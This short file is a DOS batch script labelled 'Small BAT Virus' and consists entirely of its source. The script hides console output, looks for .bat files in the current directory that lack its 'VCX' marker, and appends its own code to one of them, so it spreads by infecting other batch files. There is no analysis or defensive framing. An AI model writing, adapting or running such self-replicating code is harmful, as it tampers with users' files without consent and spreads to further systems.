   ÿ
   : Small BAT Virus
   @ctty nul
   for %%t in (*.bat) do set VCX=%%t
   for %%w in (*.bat) do find "VCX" %%w
   if errorlevel 1 type %0 >> %VCX%
